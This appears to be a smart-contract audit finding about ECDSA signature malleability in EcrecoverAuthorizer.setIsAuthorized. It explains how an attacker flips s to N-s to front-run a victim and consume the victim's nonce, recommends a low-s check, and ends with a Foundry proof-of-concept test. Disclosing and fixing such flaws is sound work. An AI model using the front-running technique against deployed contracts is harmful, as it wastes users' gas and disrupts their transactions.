### Title
ECDSA Signature Malleability in `EcrecoverAuthorizer.setIsAuthorized` Allows Nonce Consumption via Front-Run - ([File: src/periphery/EcrecoverAuthorizer.sol])

### Summary
`EcrecoverAuthorizer.setIsAuthorized` calls raw `ecrecover` without enforcing that `s` is in the lower half of the secp256k1 curve order. Because ECDSA signatures are malleable — for any valid `(v, r, s)` there exists an equally valid `(v^1, r, N-s)` recovering to the same address — an attacker who observes a victim's pending transaction can compute the malleable variant and submit it first, consuming the victim's nonce. The victim's original transaction then reverts with `InvalidNonce`, costing them gas.

### Finding Description

**Root cause — no high-s guard on `ecrecover`:**

`src/periphery/EcrecoverAuthorizer.sol` line 31:
```solidity
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
``` [1](#0-0) 

There is no check of the form `require(uint256(signature.s) <= HALF_ORDER)`. Raw `ecrecover` accepts both `(v, r, s)` and `(v', r, N-s)` as valid for the same digest and signer, where `N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141` is the secp256k1 group order and `v' = 55 - v` (flips 27 ↔ 28).

**Nonce is consumed before signature verification:**

```solidity
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
// ...
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
``` [2](#0-1) 

The nonce is incremented atomically at line 26. Any call that passes the nonce check and the `ecrecover` check — including one using the malleable variant — permanently consumes nonce `n` for `authorization.authorizer`.

**Exploit flow:**

1. Victim calls `midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim)` — `EcrecoverAuthorizer` is now authorized in Midnight on behalf of victim. [3](#0-2) 

2. Victim signs `Authorization{authorizer=victim, authorized=X, isAuthorized=true, nonce=0, deadline=type(uint256).max}`, producing `(v, r, s)`, and broadcasts the `setIsAuthorized` transaction.

3. Attacker observes the pending transaction in the mempool. Attacker computes the malleable variant:
   - `s' = N - s`
   - `v' = 55 - v` (flips 27 ↔ 28)
   - `r` unchanged, `authorization` struct unchanged.

4. Attacker submits `setIsAuthorized(auth, {v', r, s'})` with higher gas price (front-run).

5. Inside `setIsAuthorized`:
   - `block.timestamp <= deadline` — passes (deadline is `type(uint256).max`).
   - `authorization.nonce (0) == nonce[victim]++ (0)` — passes; nonce becomes 1.
   - `ecrecover(digest, v', r, s')` returns `victim` (same address as the canonical signature).
   - `signer == authorization.authorizer` — passes.
   - Authorization is applied: `midnight.setIsAuthorized(X, true, victim)` executes. [4](#0-3) 

6. Victim's original transaction arrives. `authorization.nonce (0) != nonce[victim] (1)` — reverts with `InvalidNonce`. [5](#0-4) 

**Existing checks that do NOT stop this:**
- `require(signer != address(0))` — malleable `ecrecover` still returns the correct non-zero address.
- `require(signer == authorization.authorizer || isAuthorized(...))` — same address recovered, passes.
- The `Signature` struct accepts arbitrary `v`, `r`, `s` with no range constraints. [6](#0-5) 

### Impact Explanation
An attacker can front-run any pending `setIsAuthorized` call with a malleable signature variant. The nonce is consumed by the attacker's transaction, causing the victim's original transaction to revert with `InvalidNonce`. The victim loses gas. Although the authorization state change (e.g., authorizing address X) is applied correctly by the attacker's front-run, the victim's transaction fails unexpectedly, which can cause confusion about the authorization state and wastes gas. This is a concrete, repeatable griefing path requiring no special privileges.

### Likelihood Explanation
**Preconditions:**
1. `EcrecoverAuthorizer` must be authorized in Midnight by the victim — a normal setup step any user would perform.
2. The victim must have a pending `setIsAuthorized` transaction visible in the mempool (standard public mempool behavior on all EVM chains).

Both preconditions are routine. The attack requires only mempool observation and basic ECDSA arithmetic (compute `N - s`, flip `v`). It is repeatable for every nonce the victim ever uses, as long as the victim's transactions are visible before inclusion. No special role, capital, or oracle manipulation is needed.

### Recommendation
Add a low-s enforcement check immediately after the `ecrecover` call (or before it), mirroring OpenZeppelin's `ECDSA.recover`:

```solidity
bytes32 constant SECP256K1_HALF_ORDER =
    0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;

// In setIsAuthorized, after computing digest:
require(uint256(signature.s) <= uint256(SECP256K1_HALF_ORDER), InvalidSignature());
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
```

This makes each `(digest, signer)` pair correspond to exactly one canonical `(v, r, s)` triple, eliminating the malleable variant.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {EcrecoverAuthorizer} from "src/periphery/EcrecoverAuthorizer.sol";
import {Midnight} from "src/Midnight.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract MalleabilityPoC is Test {
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    Midnight midnight;
    EcrecoverAuthorizer authorizer;

    function setUp() public {
        midnight = new Midnight();
        authorizer = new EcrecoverAuthorizer(address(midnight));
    }

    function testMalleableFrontRun() public {
        uint256 victimKey = 0xA11CE;
        address victim = vm.addr(victimKey);
        address X = makeAddr("X");
        address attacker = makeAddr("attacker");

        // Victim authorizes EcrecoverAuthorizer in Midnight
        vm.prank(victim);
        midnight.setIsAuthorized(address(authorizer), true, victim);

        // Victim constructs and signs authorization
        Authorization memory auth = Authorization({
            authorizer: victim,
            authorized: X,
            isAuthorized: true,
            nonce: 0,
            deadline: type(uint256).max
        });

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSeparator = keccak256(
            abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(authorizer))
        );
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, digest);

        // Attacker computes malleable variant
        uint8 vMalleable = v == 27 ? 28 : 27;
        bytes32 sMalleable = bytes32(N - uint256(s));

        // Attacker front-runs with malleable signature
        vm.prank(attacker);
        authorizer.setIsAuthorized(auth, Signature({v: vMalleable, r: r, s: sMalleable}));

        // Assert: authorization was applied (attacker's tx succeeded)
        assertEq(midnight.isAuthorized(victim, X), true);
        // Assert: nonce was consumed
        assertEq(authorizer.nonce(victim), 1);

        // Victim's original tx now fails with InvalidNonce
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        vm.prank(victim);
        authorizer.setIsAuthorized(auth, Signature({v: v, r: r, s: s}));
    }
}
```

**Expected assertions:**
- `midnight.isAuthorized(victim, X) == true` after attacker's front-run.
- `authorizer.nonce(victim) == 1` after attacker's front-run.
- Victim's original call reverts with `InvalidNonce`.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L26-32)
```text
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-36)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-47)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/periphery/interfaces/IEcrecoverAuthorizer.sol (L5-9)
```text
struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}
```
